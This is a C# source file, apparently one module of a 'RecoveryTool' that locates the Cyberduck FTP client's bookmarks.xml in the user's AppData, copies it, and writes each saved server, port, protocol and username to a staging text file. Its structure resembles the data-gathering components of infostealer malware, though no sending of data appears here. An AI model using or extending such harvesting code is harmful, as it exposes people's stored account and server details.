using RecoveryTool.Recovery.Utilities;
using System.Xml;

namespace RecoveryTool.Recovery.System.FTPClients
{
    public class CyberduckService
    {
        private const string ExtractedInfoFileName = "Content.txt";
        private const string BookmarksFileName = "bookmarks.xml";
        private const string CyberduckFolder = "Cyberduck";

        private static readonly string CyberduckBookmarksPath = Path.Combine(Common.AppData, CyberduckFolder, BookmarksFileName);

        public static async Task SaveCyberduckAsync()
        {
            if (!File.Exists(CyberduckBookmarksPath)) return;

            string savePath = Common.EnsureCyberduckPath();
            string destinationFile = Path.Combine(savePath, BookmarksFileName);

            await CopyBookmarksFileAsync(CyberduckBookmarksPath, destinationFile);
            await ExtractBookmarksInfoAsync(destinationFile);
        }

        private static async Task CopyBookmarksFileAsync(string sourceFile, string destinationFile)
        {
            await using FileStream sourceStream = new(sourceFile, FileMode.Open, FileAccess.Read, FileShare.Read, bufferSize: 4096, useAsync: true);
            await using FileStream destinationStream = new(destinationFile, FileMode.Create, FileAccess.Write, FileShare.None, bufferSize: 4096, useAsync: true);
            await sourceStream.CopyToAsync(destinationStream);
        }

        private static async Task ExtractBookmarksInfoAsync(string bookmarksFile)
        {
            string extractedInfoFile = Path.Combine(Path.GetDirectoryName(bookmarksFile)!, ExtractedInfoFileName);

            XmlDocument doc = new();
            doc.Load(bookmarksFile);
            XmlNodeList? bookmarkNodes = doc.SelectNodes("//bookmark");

            if (bookmarkNodes is null)
            {
                return;
            }

            await using StreamWriter writer = new(extractedInfoFile);
            foreach (XmlNode? bookmarkNode in bookmarkNodes)
            {
                if (bookmarkNode is null)
                {
                    continue;
                }

                var bookmarkInfo = new Dictionary<string, string>
                {
                    ["Nickname"] = GetNodeValue(bookmarkNode, "nickname"),
                    ["Protocol"] = GetNodeValue(bookmarkNode, "protocol"),
                    ["Server"] = GetNodeValue(bookmarkNode, "server"),
                    ["Port"] = GetNodeValue(bookmarkNode, "port"),
                    ["Username"] = GetNodeValue(bookmarkNode, "username")
                };

                foreach (var (key, value) in bookmarkInfo)
                {
                    await writer.WriteLineAsync($"{key}: {value}");
                }
                await writer.WriteLineAsync();
            }
        }

        private static string GetNodeValue(XmlNode parentNode, string childNodeName)
        {
            return parentNode.SelectSingleNode(childNodeName)?.InnerText ?? "Unknown";
        }
    }
}